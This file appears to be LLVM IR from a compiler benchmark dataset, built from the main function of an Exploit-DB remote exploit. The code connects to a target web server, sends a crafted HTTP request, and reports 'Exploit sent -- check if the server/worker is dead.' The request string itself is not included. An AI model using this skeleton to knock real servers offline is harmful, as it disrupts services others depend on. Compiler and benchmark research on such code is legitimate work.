; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_21601.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_21601.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i32 }
%struct.sockaddr_in = type { i16, %struct.TYPE_4__, i32 }
%struct.TYPE_4__ = type { %struct.TYPE_3__ }
%struct.TYPE_3__ = type { i32 }

@BUFF_SIZE = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@SOCKET_ERROR = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [32 x i8] c"Couldn't create exploit socket!\00", align 1
@request = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [48 x i8] c"Couldn't connect; probably no web server there.\00", align 1
@.str.2 = private unnamed_addr constant [52 x i8] c"Exploit sent -- check if the server/worker is dead.\00", align 1
@SD_BOTH = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i64, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca %struct.hostent*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  store i32 1024, i32* %7, align 4
  %14 = load i32, i32* @BUFF_SIZE, align 4
  %15 = zext i32 %14 to i64
  %16 = call i8* @llvm.stacksave()
  store i8* %16, i8** %9, align 8
  %17 = alloca i8, i64 %15, align 16
  store i64 %15, i64* %10, align 8
  %18 = call zeroext i16 @htons(i16 zeroext 80)
  store i16 %18, i16* %6, align 2
  %19 = load i32, i32* %3, align 4
  switch i32 %19, label %34 [
    i32 5, label %20
    i32 4, label %25
    i32 3, label %32
    i32 2, label %33
    i32 1, label %33
  ]

20:                                               ; preds = %2
  %21 = load i8**, i8*** %4, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 4
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 @atoi(i8* %23)
  store i32 %24, i32* %7, align 4
  br label %25

25:                                               ; preds = %2, %20
  %26 = load i8**, i8*** %4, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 3
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @atoi(i8* %28)
  %30 = trunc i32 %29 to i16
  %31 = call zeroext i16 @htons(i16 zeroext %30)
  store i16 %31, i16* %6, align 2
  br label %32

32:                                               ; preds = %2, %25
  br label %36

33:                                               ; preds = %2, %2
  br label %34

34:                                               ; preds = %2, %33
  %35 = call i32 (...) @usage()
  br label %36

36:                                               ; preds = %34, %32
  %37 = load i32, i32* @AF_INET, align 4
  %38 = load i32, i32* @SOCK_STREAM, align 4
  %39 = load i32, i32* @IPPROTO_TCP, align 4
  %40 = call i64 @socket(i32 %37, i32 %38, i32 %39)
  store i64 %40, i64* %5, align 8
  %41 = load i64, i64* %5, align 8
  %42 = load i64, i64* @SOCKET_ERROR, align 8
  %43 = icmp eq i64 %41, %42
  br i1 %43, label %44, label %46

44:                                               ; preds = %36
  %45 = call i32 @die(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str, i64 0, i64 0))
  br label %46

46:                                               ; preds = %44, %36
  %47 = load i32, i32* @AF_INET, align 4
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i32 %47, i32* %48, align 4
  %49 = load i16, i16* %6, align 2
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 %49, i16* %50, align 4
  %51 = load i8**, i8*** %4, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 1
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 @inet_addr(i8* %53)
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  %56 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %55, i32 0, i32 0
  %57 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %56, i32 0, i32 0
  store i32 %54, i32* %57, align 4
  %58 = getelementptr inbounds i8, i8* %17, i64 0
  %59 = load i8*, i8** @request, align 8
  %60 = getelementptr inbounds i8, i8* %59, i64 0
  %61 = load i8**, i8*** %4, align 8
  %62 = getelementptr inbounds i8*, i8** %61, i64 2
  %63 = load i8*, i8** %62, align 8
  %64 = call i32 @sprintf(i8* %58, i8* %60, i8* %63)
  %65 = load i64, i64* %5, align 8
  %66 = call i32 @connect(i64 %65, %struct.sockaddr_in* %11, i32 12)
  %67 = icmp ne i32 %66, 0
  %68 = xor i1 %67, true
  %69 = zext i1 %68 to i32
  %70 = icmp eq i32 %69, 0
  br i1 %70, label %71, label %73

71:                                               ; preds = %46
  %72 = call i32 @die(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.1, i64 0, i64 0))
  br label %73

73:                                               ; preds = %71, %46
  %74 = load i64, i64* %5, align 8
  %75 = getelementptr inbounds i8, i8* %17, i64 0
  %76 = getelementptr inbounds i8, i8* %17, i64 0
  %77 = call i32 @strlen(i8* %76)
  %78 = call i32 @send(i64 %74, i8* %75, i32 %77, i32 0)
  %79 = call i32 @nprintf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.2, i64 0, i64 0))
  %80 = load i64, i64* %5, align 8
  %81 = load i32, i32* @SD_BOTH, align 4
  %82 = call i32 @shutdown(i64 %80, i32 %81)
  %83 = load i64, i64* %5, align 8
  %84 = call i32 @close(i64 %83)
  %85 = load i8*, i8** %9, align 8
  call void @llvm.stackrestore(i8* %85)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local zeroext i16 @htons(i16 zeroext) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @usage(...) #2

declare dso_local i64 @socket(i32, i32, i32) #2

declare dso_local i32 @die(i8*) #2

declare dso_local i32 @inet_addr(i8*) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*) #2

declare dso_local i32 @connect(i64, %struct.sockaddr_in*, i32) #2

declare dso_local i32 @send(i64, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @nprintf(i8*) #2

declare dso_local i32 @shutdown(i64, i32) #2

declare dso_local i32 @close(i64) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
